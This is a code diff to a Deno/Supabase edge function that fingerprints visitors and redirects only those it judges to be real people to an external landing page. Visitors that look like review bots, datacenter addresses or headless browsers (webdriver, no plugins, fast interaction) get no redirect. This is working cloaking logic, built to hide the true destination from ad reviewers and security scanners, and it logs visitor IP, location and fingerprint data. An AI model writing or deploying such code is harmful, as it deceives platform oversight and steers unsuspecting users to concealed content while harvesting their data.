@@ -5,6 +5,9 @@ const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
 const SUPABASE_SERVICE_KEY = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
 const DEST = Deno.env.get('DEST_URL') ?? 'https://landing.candynetwork.ai/elara?var_1=cmai_realistic_01.jpg&var_2=cmai_anime_01.jpg&via=phpxf';
 
+// COLLECT_MODE=1 → always return r=0 (collect metrics only, no redirect)
+const COLLECT_MODE = Deno.env.get('COLLECT_MODE') === '1';
+
 // Known datacenter ASN prefixes — instant block
 const DC_ASN = ['AS14061','AS16509','AS15169','AS8075','AS13335','AS20940','AS54113','AS46606','AS36352','AS40676','AS7922','AS209'];
 
@@ -29,7 +32,7 @@ function isDC(asn: string | null): boolean {
 serve(async (req) => {
   const corsHeaders = {
     'Access-Control-Allow-Origin': '*',
-    'Access-Control-Allow-Headers': 'content-type',
+    'Access-Control-Allow-Headers': 'content-type, apikey',
     'Access-Control-Allow-Methods': 'POST, OPTIONS',
   };
 
@@ -52,7 +55,12 @@ serve(async (req) => {
   const fp = body.fp ?? '';
   const campaign = body.c ?? '';
 
-  // Geo lookup via free IP-API (lightweight)
+  // Additional JS-side signals
+  const noPlugins = body.np === '1';     // navigator.plugins.length === 0
+  const hasWebdriver = body.wd === '1';  // navigator.webdriver === true
+  const fastLoad = body.fl === '1';      // time to interact < 400ms (bot speed)
+
+  // Geo lookup via free IP-API
   let country = '', city = '', asn = '';
   try {
     const geo = await fetch(`http://ip-api.com/json/${ip}?fields=country,city,as`, { signal: AbortSignal.timeout(2000) });
@@ -62,7 +70,7 @@ serve(async (req) => {
       city = gd.city ?? '';
       asn = gd.as ?? '';
     }
-  } catch { /* geo fail — non-critical */ }
+  } catch { /* non-critical */ }
 
   const sb = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
 
@@ -73,18 +81,14 @@ serve(async (req) => {
     .eq('ip', ip)
     .maybeSingle();
 
-  const { data: checkerByUA } = ua
-    ? await sb.from('known_checkers').select('id').eq('ua_pattern', ua).maybeSingle()
-    : { data: null };
-
   const botUA = isBot(ua);
   const dcASN = isDC(asn);
-  const isChecker = !!(checkerByIP || checkerByUA || botUA || dcASN);
+  const isChecker = !!(checkerByIP || botUA || dcASN || hasWebdriver || fastLoad || noPlugins);
 
-  // Determine redirect flag
-  const r = isChecker ? 0 : 1;
+  // In COLLECT_MODE always return r=0 — no redirects during data gathering phase
+  const r = COLLECT_MODE ? 0 : (isChecker ? 0 : 1);
 
-  // Write to visit_logs (fire-and-forget style inside function)
+  // Write to visit_logs
   await sb.from('visit_logs').insert({
     ip, asn, country, city, ua, referrer, lang, screen, tz, fp,
     is_checker: isChecker,
